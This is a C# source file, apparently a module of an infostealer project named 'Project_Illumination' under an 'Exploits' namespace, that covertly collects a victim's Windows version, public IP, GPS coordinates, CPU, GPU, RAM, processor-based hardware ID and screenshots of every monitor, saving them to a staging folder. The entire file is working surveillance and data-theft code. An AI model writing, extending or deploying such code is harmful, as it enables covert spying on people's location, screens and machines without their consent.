using System;
using System.Device.Location;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Windows.Forms;

namespace Project_Illumination.Exploits.General
{
    internal class SystemInfo
    {
        public string HWID { get; set; }
        private readonly string _file;

        public SystemInfo()
        {
            _file = $@"{Paths.SAVE_PATH}\system_information.txt";
        }

        public void Run()
        {
            File.WriteAllText(_file, "================ System Information ================\n\n" +
                                     $"Time:     {DateTime.Now.ToString(CultureInfo.CurrentCulture)}\n" +
                                     $"System:   {WindowsInformation()}\n" +
                                     $"IP:       {GetIP()}\n" +
                                     $"GPS:      {GetGPS()}\n\n" +
                                     "================ Hardware ================\n" +
                                     $"CPU:      {GetCPUName()}\n" +
                                     $"GPU:      {GetGPUName()}\n" +
                                     $"RAM:      {GetRAM()}\n" +
                                     $"HWID:     {GetHWID()}\n" +
                                     "==========================================\n\n" +
                                     "================ Screens =================\n" +
                                     $"{GetScreens()}" +
                                     "==========================================");
        }

        private string GetRAM()
        {
            var ramValue = GetManagementValue("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem",
                "TotalPhysicalMemory");

            return ramValue != null ? (int)(Convert.ToDouble(ramValue) / 1048576) - 1 + "MB" : "Unknown.";
        }

        private string GetGPS()
        {
            using var watcher = new GeoCoordinateWatcher();
            var hasGPS = watcher.TryStart(true, TimeSpan.FromSeconds(2));

            if (!hasGPS) return "No GPS.";

            var location = watcher.Position.Location;
            watcher.Stop();

            return !location.IsUnknown ? $"{location.Latitude}, {location.Longitude}; {location.Altitude}m" : "Unknown Location.";
        }

        private string GetScreens()
        {
            var screenInformation = "";
            for (var i = 0; i < Screen.AllScreens.Length; i++)
            {
                var screen = Screen.AllScreens[i];
                screenInformation +=
                    $"Screen {i + 1}: {screen.Bounds.Width}x{screen.Bounds.Height} {(screen.Primary ? "(Primary)" : "")}\n";

                ScreenShot(screen, i + 1);
            }

            return screenInformation;
        }

        private string GetHWID()
        {
            return HWID = (string)GetManagementValue("SELECT ProcessorId FROM Win32_Processor", "ProcessorId") ?? "Unknown.";
        }

        private string GetCPUName()
        {
            return (string)GetManagementValue("SELECT Name FROM Win32_Processor", "Name") ?? "Unknown.";
        }

        private string GetGPUName()
        {
            return (string)GetManagementValue("SELECT Name FROM Win32_VideoController", "Name") ?? "Unknown.";
        }

        private object GetManagementValue(string query, string value)
        {
            object foundValue = null;
            using var managementObjectSearcher = new ManagementObjectSearcher("root\\CIMV2", query);

            foreach (var managementObject in managementObjectSearcher.Get())
            {
                foundValue = managementObject[value];
            }

            return foundValue;
        }

        private string WindowsInformation()
        {
            var windowsInformation =
                $"{GetManagementValue("SELECT Caption FROM Win32_OperatingSystem", "Caption")} " +
                $"({GetManagementValue("SELECT OSArchitecture FROM Win32_OperatingSystem", "OSArchitecture")})";


            windowsInformation = windowsInformation.Replace("NT 5.1.2600", "XP");
            windowsInformation = windowsInformation.Replace("NT 5.2.3790", "Server 2003");

            return windowsInformation;
        }

        private string GetIP()
        {
            var ip = "Unknown.";
            try
            {
                var request = (HttpWebRequest)WebRequest.Create(@"https://checkip.amazonaws.com");
                request.AutomaticDecompression = DecompressionMethods.GZip;
                request.Timeout = 1000;

                using var response = (HttpWebResponse)request.GetResponse();

                if (response.StatusCode == HttpStatusCode.OK)
                {
                    using var stream = response.GetResponseStream();
                    using var reader = new StreamReader(stream);

                    ip = reader.ReadToEnd();
                }
            }
            catch
            {
                ip = "Error while trying to get IP.";
            }

            return ip;
        }

        private void ScreenShot(Screen screen, int i)
        {
            using var bitmap = new Bitmap(screen.Bounds.Width, screen.Bounds.Height);
            using var graphics = Graphics.FromImage(bitmap);

            graphics.CopyFromScreen(screen.Bounds.Left, screen.Bounds.Top, 0, 0, bitmap.Size);
            bitmap.Save($@"{Paths.SAVE_PATH}\Screen_{i}.jpeg", ImageFormat.Jpeg);
        }
    }
}
